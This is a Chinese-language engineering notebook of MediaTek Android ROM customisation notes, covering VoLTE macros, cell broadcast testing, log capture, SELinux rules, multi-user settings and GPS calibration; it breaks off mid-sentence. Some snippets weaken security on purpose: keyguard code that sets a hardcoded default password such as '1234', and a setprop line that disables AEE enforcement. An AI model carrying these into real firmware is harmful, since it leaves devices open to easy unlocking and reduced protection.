[Project_Name] _debug_defconfig, e.g. k55v1_64_om_lwg_volte_ss_debug _defconfig
Set CONFIG_MTK_MD_SBP_CUSTOM_VALUE = "0"

ps:SBP ID在M平台上用16进制，在N平台上要转化为10进制

VOWIFI 如何配置
1、 MTK_MD_SBP_CUSTOM_VALUE = 0 
2、MTK_MULTIPLE_IMS_SUPPORT = 2（双卡配置为2,单卡配置为1）
3、MTK_WFC_SUPPORT = yes

注意点：
doro 智能机项目 客户反馈，在插卡情况下，拨打紧急号码，并快速挂断，多次后会出现挂不断现象，MTK 回复是由于打开了跟volte相关的两个宏：
MTK_VOLTE_SUPPORT=YES
MTK_IMS_SUPPORT=YES
MTK原始代码对volte是没有配置的的，但是却开着这两个宏，如果当地网络支持IMS功能，手机就会出现挂不断现象。
为了防止再次出现这个问题，请各位以后带项目的时候，检查一下这两个宏，如果项目没有配置volte，请将
MTK_VOLTE_SUPPORT =no，
MTK_IMS_SUPPORT=no

问题：客户场测发现，插入当地卡，无法显示VOLTE
原因：OPTR_SPEC_SEG_DEF = NONE，但是persist.operator.optr设置成CUST，才出现这个问题！只要persist.operator.optr变为空就行
```

## [小区广播] SAE（紧急小区广播）

```text
具体可看 redmine39255
文件在 alps/vendor/mediatek/proprietary/packages/apps/CMASReceiver
```

## [小区广播] 国内使用8960模拟小区广播功能

```text
因为中国大陆地区的运营商不支持小区广播，所以只能通过使用仪器的方式模拟测试小区广播。以下文档说明如何使用Agilent 8960仪器测试GSM 小区广播

测试需要用到以下设备材料，请提前准备好：
1，一台支持小区信令测试的射频综测仪：Agilent 8960/R&S CMW500等（下面的SOP以Agilent  8960为例）
2，测试仪器对应的白卡（一张和仪器配套的SIM卡），以及用于连接手机和仪器的射频线
3，一台支持小区广播功能的测试手机

Step-by-step guide
1，手机插入白卡，然后开机，确保小区广播开关处于开启状态
2，按开关按钮启动8960仪器
3，仪器启动完成之后点击仪器面板上的System Config按钮进入系统配置界面
4，在配置界面查看当前运行的Application，确认当前运行的是“GSM/GPRS Lab App”,如果不是该应用请通过UI上的“Application Switch”切换到该应用（切换应用会自动重启仪器）。
5，按操作面板上的“Call SETUP”按钮，进入Call Setup Screen，然后按“Active Cell”按钮，选择Operation Mode为"Active Cell(GSM)"
6, 完整以上配置之后，再将手机和仪器通过射频线连接（注意当前测试的是GSM，请连接到手机上的GSM的射频口）
7，等待手机注册到仪器，注册上之后在手机的状态栏可以看到信号图标。
    如果长时间没有注册上网络，可以在手机上通过开启飞行模式再关闭的方式触发手机端的驻网流程
8，确认注册上网络之后在Call Setup 界面按“1 of 4” 按钮翻到下一页，选中“Short Message Service”
9，进入"Short Message Service"界面，选中“CellBroadcast”
10，进入“Cell Broadcast”界面，可以通过Message Setup设定CB信息的“Geographical Scope”/"Message Code"/"Message Identifier"/DCS/content等信息.
11, 按“Start Cell Broadcast”按钮仪器就会下发设定的CB Message给手机。
```

## [小区广播]  [FAQ18280]  如何搭建小区广播环境

```text
有些厂商需要搭建小广播环境，使用RACAL 6104
1.仪器设定
Step1. 点选Parameters
Step2. 选CCH/TCM设定
Step3. 设定Channel Level/TCH Level（数值设越大，强度越大）
Step4. 设定Message ID
    Coding Scheme(1:文字/ 17:乱码 87：空白)
    Repetition Interval/Initial Delay/Transmit Message
Step5. 如果手机已经camp上网路，仪器上的status会显示相关资讯

2.手机设定
Step1. 插入白卡
Step2. Camp on network
Step3. Go to message->settings->Trun on Cell Broadcast
```

## [bug] 如何设置省电模式/[Bug] (显示)更换电池，原先低电量保护显示机制不会消失(redmine76107)

```text
后面的这个问题是由于没有默认设置低电量level值的原因（数据库已经存在，只是没有默认值），frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java中加入loadIntegerSetting(stmt, Settings.Global.LOW_POWER_MODE_TRIGGER_LEVEL,
R.integer.def_low_battery_level);即可
其次，设置最低电量等级的是Settings.Global.LOW_POWER_MODE_TRIGGER_LEVEL这个数据库，直接去设置数据库即可

如何在settings-->battery-->menu-->battery saver中低电量level的值，首先在packages/apps/Settings/res/values/arrays.xml中battery_saver_trigger_values值，可以去新加或者去修改，然后在packages/apps/Settings/src/com/android/settings/fuelgauge/BatterySaverSettings.java文件中onActivityCreated(Bundle savedInstanceState)方法中的new SettingPref中的默认值参数（这个去设置的时候必须是battery_saver_trigger_values中的其中一个才有效，因为他会去遍历这个battery_saver_trigger_values数组），也就是说哪怕没有设置默认值，当进入这个文件也会去设置上面数据库的值，所以我们在刚刷机后去进行默认值的设置的时候最好跟你settings中去重新设置的是一样的，这样就可以保持一致性。
```

## [默认值] 如何使<32M,手机内存就不能push或者复制进去东西

```text
FAQ14938 关于文件系统空间预留的说明  --->可以修改第一点以及data区那个点即可实现，即kernel-3.18/fs/ext4/super.c文件中把resv_clusters = min_t(ext4_fsblk_t, resv_clusters, 4096)改为resv_clusters = min_t(ext4_fsblk_t, resv_clusters, 8192)，同时device/mediatek/mt6735/init.mt6735.rc文件中把exec /system/bin/tune2fs -O has_journal -u 10010 -r 4096 /dev/block/platform/mtk-msdc.0/11230000.msdc0/by-name/userdata修改为exec /system/bin/tune2fs -O has_journal -u 10010 -r 0 /dev/block/platform/mtk-msdc.0/11230000.msdc0/by-name/userdata
```

## [默认值] 如何关闭多用户功能

```text
设置为如下：
MTK_2SDCARD_SWAP = yes(这个可能可有可无)
MTK_OWNER_SDCARD_ONLY_SUPPORT=no
sagereal_add_multiuser = no
config_enableMultiUserUI = false
config_multiuserMaximumUsers = 1

[FAQ13688] 【Multi-user】如何在L版本上打开Multi-user?
[FAQ18300] 如何确认M版本上Multi-user的配置是否ok?
[FAQ13578] Multi-user模式下，user A设置的闹钟，在user B有铃声无画面，无法关闭
[FAQ14403] 【multi-user】android 5.1 如何打开 android.software.managed_users 功能
```

## [log] 通话 log 抓取

```text
当通话时出现问题，该抓取什么log（一般抓取vm log即可）
通常Speech测试，提供一般通话log即可，如果有通话无声问题在确认为非网络原因导致，则需要按照通话无声重新提供log。
VM log抓取：按*#*#3646633#*#*进入工模/Hardware Testing/Audio/speech logger,勾选上Enable speech log+EPL(Enhanced PCM Log),打开vmlog后每打一通电话便会在mtklog/audio_dump中生成一个*.vm文件，其以通话开始时间命名。
```

## [log] 蓝牙 log 抓取

```text
当关于蓝牙的时候的bug，应该抓取什么log ---->hci log
HCI(Host Controller Interface，主机控制接口) HCI,属于蓝牙协议栈的一部分。
蓝牙规范包含了一个符合标准的接口定义(主机控制器接口),它适用于蓝牙通讯模块的硬件部分。此定义描述了位于HCI驱动程序(主机的一部分,也即蓝牙通讯模块的使用者)和主机控制器固件(蓝牙通讯模块本身的一部分)之间的接口
settings->developer options->enable bluetooth snoop hci log->勾选

路径位置：不同平台位置有所不同：
M平台：/sdcard/mtklog/btlog/
L平台：adb命令：/data/@btmtk/
```

## [log]  [gps]  [FAQ05622] GPS问题所需要录制的log及方法

```text
对于通常遇到的GPS问题，需要录制什么log，以及如何录制。

[SOLUTION] 
对于GPS问题，请提供mobile log和GPS debug log。
log 抓取办法如下：
1. 进到工程模式，打开YGPS。
2. 点击“NMEA Log->Enable dbg2file [Need Restart] ”按钮和“NMEA Log->Enable dbg2ddms [Need Restart] ”按钮。
3. 退出YGPS，间隔至少3s后，再进入GPS应用程序（如导航软件，YGPS）开始测试，这样才能确保操作生效。
4. log最后会存放在手机的/data/misc/gpsdebug.log.xxx，测试完后请将log提供给我们分析。
5. 附上log的同时也请告知复现问题的操作步骤以及复现问题的时间点，如hh:mm:ss出现什么现象。
note:
1.测试时请选择GPS信号良好的空地（视野范围内无建筑物遮挡）进行测试，以排除环境因素导致无法定位，定位慢，定位漂移等问题。
2.测试前请确保测试机有root 权限，可以访问/data/misc/路径，可以将gps debug log用adb拉出来。
3.测试完成后请注意以下事项
a.请进入YGPS，点击“NMEA Log->disable dbg2file [Need Restart] ”按钮，然后退出YGPS，这样才能确保操作生效。否则，只要打开GPS，就会录制debug log，这样会占用更多的存储空间，导致不可预测的问题发生。
b.将/data/misc/gpsdebug.log.xxx删除，因为即使disable dbg2file以后，这笔log仍然会在/data/misc/。
【Mobile log抓取方法】
1. 进入工程模式，找到system logger进行相应设置,打开mobile log、net log、modem log。
2. 测试完成后，请将SD卡中mtklog文件夹中的所有log提供给我们。
```

## [apn] spn系统获取的优先级

```text
在frameworks/opt/telephony/src/java/com/android/internal/telephony/uicc/SpnOverride.java文件lookupOperatorName方法中去获取那几个在system/etc下的spn文件，但是在显示过程中会先去判断，如下：
if ((numeric.equals("46000")) || (numeric.equals("46002")) || (numeric.equals("46007")) || (numeric.equals("46008"))) {
        operName = context.getText(com.mediatek.R.string.oper_long_46000).toString();
    } else if ((numeric.equals("46001")) || (numeric.equals("46009"))) {
        operName = context.getText(com.mediatek.R.string.oper_long_46001).toString();
    } else if ((numeric.equals("46003")) || (numeric.equals("46011")) || getFromResource) {
        operName = context.getText(com.mediatek.R.string.oper_long_46003).toString();
    } else if (numeric.equals("46601")) {
        operName = context.getText(com.mediatek.R.string.oper_long_46601).toString();
    } else if (numeric.equals("46692")) {
        operName = context.getText(com.mediatek.R.string.oper_long_46692).toString();
    } else if (numeric.equals("46697")) {
        operName = context.getText(com.mediatek.R.string.oper_long_46697).toString();
    } else if (numeric.equals("99998")) {
        operName = context.getText(com.mediatek.R.string.oper_long_99998).toString();
    } else if (numeric.equals("99999")) {
        operName = context.getText(com.mediatek.R.string.oper_long_99999).toString();
    } else {
        // If can't found corresspoding operator in string resource, lookup from spn_conf.xml
        if (containsCarrier(numeric)) {
            operName = getSpn(numeric);
        } else {
            Rlog.w(LOG_TAG, "Can't find long operator name for " + numeric);
        }
所以，有些比如说显示的CMCC、CU都是在这里判断显示的，并不是在spn文件中去写的
ps：在这个方法中可以看到，获取显示名字的优先级为getSpnByEfSpn(etc/virtual-spn-conf-by-efspn.xml) 》 getSpnByImsi(etc/virtual-spn-conf-by-imsi.xml) 》 getSpnByEfPnn(etc/virtual-spn-conf-by-efpnn.xml) 》 getSpnByEfGid(etc/virtual-spn-conf-by-efgid1.xml) 》  etc/spn-conf.xml

virtual-spn-conf-by-efspn.xml文件中的efspn一般是在log中去抓取的，其实就是写在sim卡中的，所以优先级相当于sim卡最高，至于为什么要出现这几个xml文件，就是为了区别网络运营商和运营商，因为这两个的mnc和mcc是一样的，所以就用网络运营商中的efspn等值来区别开来
```

## [默认值] 单双卡配置，修改该宏的值

```text
MTK_MULTI_SIM_SUPPORT
path:ALPS-MP-N0.MP2-V1_SR6580_WE_N/sagereal/mk/project**/ProjectConfig.mk
1.ss -单卡
2.dsds/dsda -双卡 （区别：dsds双卡双待，dsda双卡双通，我们公司基本都是dsds)
3.tsts -三卡
4.qsqs -四卡
比如双卡配置：MTK_MULTI_SIM_SUPPORT = dsds
```

## 开机向导中一直会出现Permissions denied: You can change them in Settings > Apps的提醒

```text
这是因为有两个日历（calendar）引起的，如果只有一个日历就不会出现这个问题
如果客户一定要两个日历都存在，需要去把mtk日历的权限去默认打开；如果只存在其中一个日历，不会出现该问题
```

## [log] 连上wifi后经常断开再连上

```text
1、当碰到这种事情的时候，先去楼下环境（各种wifi或者热点比较少的环境下，可能会相互影响）去测试下，看是否ok
2、如果还是NOK，就需要我们在main_log或者kenerl_log中去搜一下“reason”，一般是能搜到断开wifi的reason的
3、再不行就要提MTK了，问问有没有patch  ALPS02358954
```

## [FAQ02941] ro.operator.optr属性问题

```text
ro.operator.optr属性是代表工程中运营商的偏好行为，会在ProjectConfig.mk中由OPTR_SPEC_SEG_DEF的值来指定。目前这个属性只有八个值：OP01、OP02、OP03、OP06、OP07、OP08、OP09、OP10。
OP01表示中国移动（CMCC）
OP02表示中国联通（CU）
OP03表示Orange
OP06表示Vodafone
OP07表示AT&T
OP08表示TMO-US
OP09表示中国电信（CT）
OP10表示Tier-2 operator
且这个属性值目前无法增加其他的值。
```

## 如何跳转到某个apk的detail界面，即加权限界面

```text Java
Intent in = new Intent().setAction(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
    .setData(Uri.fromParts("package", "com.android.mms", null))
    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
mContext.startActivity(in);

如何通过 adb 的方式???
```

## *res/raw和assets的相同点和不同点

```text
*res/raw和assets的相同点：
1.两者目录下的文件在打包后会原封不动的保存在apk包中，不会被编译成二进制。

*res/raw和assets的不同点：
1.res/raw中的文件会被映射到R.java文件中，访问的时候直接使用资源ID即R.id.filename；assets文件夹下的文件不会被映射到R.java中，访问的时候需要AssetManager类。
2.res/raw不可以有目录结构，而assets则可以有目录结构，也就是assets目录下可以再建立文件夹
*读取文件资源：
InputStream is =getResources().openRawResource(R.id.filename);
2.读取assets下的文件资源，通过以下方式获取输入流来进行写操作
AssetManager am = null;
am = getAssets();
InputStream is = am.open("filename"); 
注意1：Google的Android系统处理Assert有个bug，在AssertManager中不能处理单个超过1MB的文件，不然会报异常，raw没这个限制可以放个4MB的Mp3文件没问题。
注意2：assets 文件夹是存放不进行编译加工的原生文件，即该文件夹里面的文件不会像 xml， java 文件被预编译，可以存放一些图片，html，js, css 等文件。
```

## [log] 如果在非launcher界面，短信会以toast的形式显示出来  （一般都是直接在状态栏提醒下）

```text
可以搜索enqueueToast，然后发现如下log，可以发现pkg是什么，也就是是因为哪个apk才出现该toast
./mobilelog/APLog_2017_0306_212156/sys_log:03-06 21:22:21.511677   788  9291 I NotificationService: enqueueToast pkg=com.beyond.cineplanet callback=android.app.ITransientNotification$Stub$Proxy@83465a6 duration=0
```

## [log]  [selinux] SeLinux相关

```text
如何加selinux权限
log：
01-01 09:05:45.210000  8349  8349 W Thread-235: type=1400 audit(0.0:124): avc: denied { write } for name="brightness" dev="sysfs" ino=10091 scontext=u:r:system_app:s0 tcontext=u:object_r:sysfs:s0 tclass=file permissive=0
01-01 09:05:45.220918  1630  8346 D NuPlayerRenderer: renderer set speed = 1
01-01 09:05:45.221295  1630  8346 E NuPlayer: onScanSources
01-01 09:05:45.221736  1630  8346 D Utils   : kKeyEndian in utils is 2
01-01 09:05:45.221830  3024  8349 W System.err: java.io.FileNotFoundException: /sys/class/leds/green/brightness: open failed: EACCES (Permission denied)

内置到system/priv-app/下的第三方apk，因selinux 权限问题，无法点亮LED

解析：
audit2allow -i 111.txt

#============= system_app ==============
allow system_app sysfs:file write;

如果直接加在system_app.te中，会与externel下文件冲突，导致编译报错，可以重新定义类型：

添加：
------＞file.te
#liangshuang add for green led 2016-12-28
type sys_green_brightness_file, fs_type,sysfs_type;

file_contexts
#liangshuang add for green led 2016-12-28
/sys/class/leds/green/brightness u:object_r:sys_green_brightness_file:s0

system_app.te
#liangshuang add for green led 2016-12-28
allow system_app sys_green_brightness_file:file write;

system_server.te
#liangshuang add for green led 2016-12-28
allow system_server sys_green_brightness_file:file write;

快速编译验证
mmm external/sepolicy
make -j24 ramdisk-nodeps
make -j24 bootimage-nodeps
然后再重新刷bootimage 测试.

ps：[FAQ13324]  SELinux 常见问题汇总
[FAQ13820]  Android L APP 如何获取proc file system 中节点的写权限
[FAQ13635]  Android L APP 如何获取sys file system 中节点的写权限
[FAQ11486]  [SELinux Policy]  如何设置SELinux 策略规则 ? 在Kernel Log 中出现"avc: denied" 要如何处理?

新加冲突的selinux权限方法：
(1)、先在file.te/property.te/device.te等文件中定义
(2)、在file_contexts/gen_contexts等对应文件中绑定第(1)步定义的label
(3)、在对应的.te文件中申请权限，即allow system_server sys_green_brightness_file:file write;样式，如果用audit2allow跑出来的.te文件不存在，则可以重新新建一个
```

## 有些4+512的项目安装大型第三方apk会出现安装时间长，在安装过程中去操作系统会出现卡顿的现象  ----->5012_LP的项目（M）

```text
在L、M版本上：art/dex2oat/dex2oat.cc文件中最上面定义如下代码：
#define IS_APP(appname) ((!oat_filename_.empty() && (oat_filename_.find(appname) != std::string::npos)) ||  \
    (!zip_location_.empty() && (zip_location_.find(appname) != std::string::npos)) ||  \
    (!oat_location_.empty() && (oat_location_.find(appname) != std::string::npos)))
然后在compiler_options_.reset(new CompilerOptions这句话前面加上如下代码：
if( IS_APP("facebook") || IS_APP("youtube") || IS_APP("skype") || IS_APP("twitter") ) {
    compiler_filter = CompilerOptions::kInterpretOnly;
    LOG(INFO) <<" This apk is in whitelist, so set interpret-only ";
}
```

## [FAQ06165]  [NVRAM]  [SIM_ME_LOCK] protect_f和protect_s分区的作用是什么?

```text
[Description] 
protect_f和protect_s分区的作用是什么?

[Solution] 
在没有Protect_s和Protect_f分区之前，SIM ME LOCK数据存在USER DATA分区内，详细路径为/data/nvram/md/NVRAM/IMPORTANT。
当恢复出厂设置时，会将/data/nvram/md/下的文件全部清除，其后开机时会将NVRAM BIN Region中备份的数据recovery到/data/nvram/md/下。

如NVRAM BIN REGION中数据为空，则会按照默认值生成SIM ME LOCK数据。
如NVRAM BIN REGION中数据不为空，则会将SIM ME LOCK数据恢复为NVRAM BIN REGION保存的状态。

针对case 2，由于NVRAM BIN REGION中保存的状态并不总是同恢复出厂之前/data/nvram/md/NVRAM/IMPORTANT下的SIM ME LOCK数据状态一致，因此可能无法满足SML 的更新一致性要求。

为了对SML数据进行持久化保存以及更新一致性的目的，我们将SML数据移入Protect_s和Protect_f分区。

Protect_s和Protect_f分区的特点有：
Download的时候若要format USERDATA分区时，不会format Protect_s和Protect_f。
恢复出厂设置时，也不会清除 Protect_s和Protect_f。但若此时BIN Region中无内容，开机时会判断出USERDATA分区中/data/nvram/md不存在且BIN Region中无内容，进而断定是第一次开机从而根据默认值生成SIM ME LOCK。

[FAQ04454]  [NVRAM] modem内的哪些NVRAM会被备份到BIN Region?
Protect_s和Protect_f分区数据是不会被备份到bin区的。
把数据放入到product_info就能实现该数据在回恢复出厂设置的时候不丢失
```

## [默认值] gps默认关闭

```text
当把gps默认关闭后，开机向导会把gps去打开（此时打开的是network，即battery saving），此时要关闭的话，必须在开机向导结束后去修改数据库
1.首先需要将def_location_providers_allowed置为空，即系统认为的默认关闭  2.默认关闭后仍然开启，则抓取第一次开机log，搜索gps字段的关键字location_providers_allowed
3.在sys log中搜索到call_put(secure:location_providers_allowed=+network) for 0   4.同样定位到SettingsProvider.java的call方法，我们也可以在这里做处理
继续查看redmine对应提交记录，我们最终是在Settings.java的putStringForUser方法中修改的，我们可以看到putStringForUser中，最后调用了cp.call(cr.getPackageName(), mCallSetCommand, name, arg);
这句代码最终调用的就是SettingsProvider.java里面的call方法
在Settings.java的putStringForUser方法中加上如下代码
if (Secure.getInt(cr,Secure.USER_SETUP_COMPLETE,0) == 0 && name.equals(Secure.LOCATION_PROVIDERS_ALLOWED)) {
    if(!android.util.FeatureOption.SAGEREAL_GPS_WORKON_WIZARD){
        return true;
    }
}
具体可参考如下文档：/home/jiangcunbin/Desktop/sagereal资料/自己总结/GMS认证/GMS包引起问题分析_new/GMS包引起问题分析.ppt
```

## 多用户相关

```text
FAQ13688 【Multi-user】如何在L版本上打开Multi-user?
FAQ14403 【multi-user】android 5.1 如何打开 android.software.managed_users 功能
1. 在sagereal/mk/Project_name/ProjectConfig.mk文件中开以下宏
config_enableMultiUserUI = true
config_multiuserMaximumUsers = 8  //此宏值不小于2,
/*
以上两个宏也可以在alps/frameworks/base/core/res/resalues/config.xml文件中直接设置默认值
<bool name="config_enableMultiUserUI">true</bool>
<integer name="config_multiuserMaximumUsers">8</integer>
*/
MTK_2SDCARD_SWAP = no
MTK_OWNER_SDCARD_ONLY_SUPPORT = yes
MTK_SHARED_SDCARD = yes
2. 在alps/devicegetel/sr6572_wet_l/system.prop文件中ro值
ro.config.low_ram=false
若上面文件中没有该值，可以去alps/devicegetel/sr6572_wet_l/device.mk文件中找到ro.config.low_ram，并设置为false
3. 在alps/frameworks/native/data/etc/handheld_core_hardware.xml文件中打开手机多功能系统服务
<feature name="android.software.managed_users" />
<feature name="android.software.device_admin" />
4. AndroidForWork.apk is mandatory to preload on all GMS devices.  //Google App中必须包含该APK
注意：若要添加多用户功能，必须配置好以上4点，否则CTS测试会有15项测试不通过。

1，Check managered_users configuration:
adb shell pm list features
看是否有android.software.managed_users
2，check multi-user number
adb shell pm  get-max-users
获取到的个数应该大于1
3，check multi-user UI
adb shell getprop fw.show_multiuserui
这个值应该是true。
```

## [默认值] 如何添加widevine

```text
http://172.16.78.132:8002/gitweb/?p=repositories/ALPS-MP-N0.MP2-V1_SR6580_WE_N.git;a=commitdiff;h=b942425cc932e1cdfb716cda72a37183ed87c995;hp=a9460b27dce8bb4163bf92522aae534af9ade5bf
修改方法：
(1)、alps/device/mediatek/common/device.mk
ifeq (yes, $(strip $(SAGEREAL_WIDEVINE_SUPPORT)))
$(shell cp $(TOPDIR)device/mediatek/common/widevine_on/SECRO_GMP.ini  $(TOPDIR)vendor/mediatek/proprietary/custom/common/secro/SECRO_GMP.ini)
else
$(shell cp $(TOPDIR)device/mediatek/common/widevine_off/SECRO_GMP.ini  $(TOPDIR)vendor/mediatek/proprietary/custom/common/secro/SECRO_GMP.ini)
endif 
(2)、alps/device/mediatek/common/widevine_off/SECRO_GMP.ini  新建的文件
(3)、alps/device/mediatek/common/widevine_on/SECRO_GMP.ini  新建的文件
(4)、sagereal/mk/VP40_H4007/ProjectConfig.mk   ---->  SAGEREAL_WIDEVINE_SUPPORT = yes
(5)、sagereal/script/makesagerealAction.sh
把make -j8 sign-image 2>&1 | tee sign-image_build.log修改为make -j8 sign-image-nodeps 2>&1 | tee sign-image_build.log
```

## [默认值]  [FAQ20101] 增加National data roaming 菜单定制

```text
这里的漫游，是指手机使用一个运营商的SIM卡，注册上另一个运营商的网络。
International Roaming: Operator A的sim卡注册到了和Operator A不同国家的其他Operator的plmn上；
National Roaming: Operator A的sim卡注册到了和Operator A相同国家的其他Operator的plmn上；
ps:[FAQ09599] 如何默认勾选DATA ROAMING
```

## [默认值] 如何加默认权限

```text
frameworks/base/services/core/java/com/android/server/pm/DefaultPermissionGrantPolicy.java文件，如果要加某个package的权限，可以使用PackageParser.Package coppelPackage = getPackageLPr("com.esoft.movil.coppel")方法，“com.esoft.movil.coppel”为包名
```

## [性能] 如何把四个cpu同时打开，提高速度

```text
echo 0 > /proc/hps/enabled
echo 1 > /sys/devices/system/cpu/cpu0/online
echo 1 > /sys/devices/system/cpu/cpu1/online
echo 1 > /sys/devices/system/cpu/cpu2/online
echo 1 > /sys/devices/system/cpu/cpu3/online
```

## 省晶体软件 （GPS）  ----> gps需要校准

```text
1、Coclock是会节省一颗TCXO物料。
2、通过check log中CO、C1的值是否为0，为0表示校准失败 ，否则校准成功。
mnl_linux: linux_gps_init: init_cfg.C0 = 0
mnl_linux: linux_gps_init: init_cfg.C1 = 0
3、关于GPS校准，针对的是采用coclock 方案的项目:
1.涉及到的宏及路径：
MTK_GPS_CO_CLOCK_DATA_IN_MD
 
M版本在project.mak中
 
N版本在
/vendor/mediatek/proprietary/hardware/connectivity/gps/mtk_mnld/Android.mak
 
2.开关宏的标准：
看平台是否support LTE，若平台support LTE，則C0/C1是從MD NVRAM讀取，则
要打开这个宏控；若平台not support LTE，則C0/C1是從AP NVRAM讀取(如6580)，则
要关闭这个宏控。
4、备份GPS参数具体有哪些?
[GPS COClock Coefficients] 
C0=0
C1=-0.224999994039536
initU=0
lastU=0
如果C0/C1是從MD NVRAM讀取，则可以直接用用meta工具（modem版本）去备份出这些参数。如果C0/C1是從AP NVRAM讀取(如6580)，则需要用张迪最新开发的apk
```

## [知识点] RTC

```text
RTC有其自己的供电系统,所以在手机处于关机状态时，RTC仍然可以正常工作，关机闹钟的时候就是通过RTC的自己的供电系统去检测
```

## calendar日历中有个pop-up notification

```text
M/N：该功能实现就是出悬挂式的notification，悬挂式Notification是android5.0新增加的方式，和前两种显示方式不同的是，前两种需要下拉通知栏才能看到通知，而 悬挂式Notification不需要下拉通知栏就直接显示出来悬挂在屏幕上方并且焦点不变仍在用户操作的界面因此不会打断用户的操作，过几秒就会自动消失。
和前两种Notification不同的是，他需要调用setFullScreenIntent来将Notification变为悬挂式Notification
notificationBuilder.setFullScreenIntent(pendingIntent1, false);// 横幅，悬挂式
```

## [默认值] 如何将默认滑动解锁改为 pin/password 解锁

```text
[DESCRIPTION] 
目前 google 采用默认滑动解锁的方式
如果想改成默认其它的解锁方式, 必设定一个初始密码
请参考如下 solution:

[SOLUTION] 
在 KeyguardViewMediator.java 的 onSystemReady 方法中的开始位置
判断是否为首次开机, 如果是就加入下面这段 code 去设置密码

public void onSystemReady(){
       ...
+       if(mUpdateMonitor.isDeviceProvisioned()){//判断是否首次开机
+             mLockPatternUtils.saveLockPassword("password",DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC);    //设置password为默认解锁类型
+       }
       doKeyguardLocked(null);
       ...
}

如要修改成PIN, 用如下部分替换上述红色代码
mLockPatternUtils.saveLockPassword("1234",DevicePolicyManager.PASSWORD_QUALITY_NUMERIC);

请自行修改上述参数达到设置不同解锁方式及密码的效果
```

## [log] 当长时间播放视频或者播放音乐出现无声音现象

```text
可以搜下no more track availble这块log，然后是否有如下类似的log
Dear customer,
06-07 12:55:30.413251 299 6231 E AudioFlinger_Threads: no more track availble
06-07 12:55:30.413311 299 6231 E AudioFlinger_Threads: track name: 4104, ID 10097
06-07 12:55:30.413362 299 6231 E AudioFlinger_Threads: track name: 4101, ID 10097
06-07 12:55:30.413411 299 6231 E AudioFlinger_Threads: track name: 4117, ID 10097
06-07 12:55:30.413459 299 6231 E AudioFlinger_Threads: track name: 4120, ID 10097
06-07 12:55:30.413507 299 6231 E AudioFlinger_Threads: track name: 4123, ID 10097
06-07 12:55:30.413558 299 6231 E AudioFlinger_Threads: track name: 4106, ID 10097
06-07 12:55:30.413610 299 6231 E AudioFlinger_Threads: track name: 4108, ID 10097
06-07 12:55:30.413658 299 6231 E AudioFlinger_Threads: track name: 4111, ID 10097
06-07 12:55:30.413710 299 6231 E AudioFlinger_Threads: track name: 4114, ID 10097
06-07 12:55:30.413764 299 6231 E AudioFlinger_Threads: track name: 4126, ID 10097
06-07 12:55:30.413812 299 6231 E AudioFlinger_Threads: track name: 4113, ID 10097
06-07 12:55:30.413895 299 6231 E AudioFlinger_Threads: track name: 4110, ID 10097
06-07 12:55:30.413950 299 6231 E AudioFlinger_Threads: track name: 4103, ID 10097
06-07 12:55:30.414009 299 6231 E AudioFlinger_Threads: track name: 4119, ID 10097
06-07 12:55:30.414062 299 6231 E AudioFlinger_Threads: track name: 4107, ID 10097
06-07 12:55:30.414113 299 6231 E AudioFlinger_Threads: track name: 4100, ID 10097
06-07 12:55:30.414165 299 6231 E AudioFlinger_Threads: track name: 4098, ID 10097
06-07 12:55:30.414214 299 6231 E AudioFlinger_Threads: track name: 4099, ID 10097
06-07 12:55:30.414282 299 6231 E AudioFlinger_Threads: track name: 4102, ID 10097
06-07 12:55:30.414363 299 6231 E AudioFlinger_Threads: track name: 4105, ID 10097
06-07 12:55:30.414412 299 6231 E AudioFlinger_Threads: track name: 4109, ID 10097
06-07 12:55:30.414465 299 6231 E AudioFlinger_Threads: track name: 4112, ID 10097
06-07 12:55:30.414518 299 6231 E AudioFlinger_Threads: track name: 4115, ID 10097
06-07 12:55:30.414572 299 6231 E AudioFlinger_Threads: track name: 4118, ID 10097

根据google设计，track最多只能有32个。
出现audiotrack报错，是因为track被占满了，如上LOG。
在events log可以看到10097是水果忍者进程：
06-07 12:48:56.314997 940 3309 I am_proc_start: [0,4207,10097,com.halfbrick.fruitninjahd,activity,com.halfbrick.fruitninjahd/com.halfbrick.fruitninja.FruitNinjaActivity] 
通话没有问题是因为通话不需要audio track，数据不经AP，直接走MODEM。
综上，这个应该是属于水果忍者第三方APK的问题，使用了以后没有释放track导致的。
请知，谢谢！
```

## [log] 关于抓取mtklog

```text
1、eng版本在抓取log的时候，可以把mtklog中的taglog关闭，taglog的作用：当系统有exception(如NE，ANR)发生时会弹出这个Tag Log的框，作用是把当前exception的log保存到SD card的，做记录Log之用，当ANR等情况下会把log压缩至mtklog/taglog/文件下；如果关闭该功能的话，按照正常的log抓取，具体可参考[FAQ03748]  TagLog功能简述
2、userdebug版本有时候会出现无法抓取到aee_exp文件的情况，这是因为Android M/N, 因受security 限制, aee 如果mode 开到3, 权限太大, 会导致安全问题， 后续user/userdebug build 默认设置成了mode 4 , 并且mobile log 无法  直接切成mode 3. 导致开了mtklogger 后也只能抓到fatal db （见下表），而不能抓到普通exception db;具体修改
如果需要在user load 中打开mobilelogd 后，能够切换到aee mode3 抓到普通exception db ，可以参考以下修改：关闭强制性约束.
/vendor/mediatek/proprietary/external/aee/config_external/init.aee.customer.rc 文件中添加
on init
setprop ro.aee.enforcing no
（在出货版本中，切记把此行 注释掉）
具体可以参考[FAQ20159]  Android M/N user load，在打了aee security enhance patch 后，如何抓到普通aee db?
```

## [recovery]  [ota] 升级modem

```text
FAQ18188 [Recovery]  [Common] Android M 版本如何升级logo等rawdata分区方法?  ---> 比如说modem端的MD1IMG等分区的升级
同时要参考FAQ17441 [Recovery]  [Common]  Android M 版本如何升级lk 、preloader
```

## 如何让apk只能当签了某个特定的key后才能安装?

```text
http://192.168.3.76:8007/gitweb/?p=MT6572_JB3_LCA_MP3.git;a=commitdiff;h=8c9ab90ee555e59a1f518dfb938c7851bc073cd3;hp=2a633d6df3a3f83d41826376e31fdd9db1321f36
原理：在 PackageInstallerActivity.java 文件中去获取安装的apk的签名信息（2进制），然后和某个特定的key去对比是否相同，如果相同的话，就直接正常安装（安装apk的方法一直存在），如果不同的话，就是跳出一个对话框而已，不去走安装的方法，原理上platform还是正常的平台签名，key只是某个客户提供的普通key而已，不能认为把platform改成了某个key了，只是当你只签平台签名的时候，不可安装而已，但是当你只安装特定key的时候，该apk不会有平台签名的权限！
```

## [log] 手机重启数次进入recovery模式，log分析

```text
您好！从贵司的log中有看到大量JE如下：
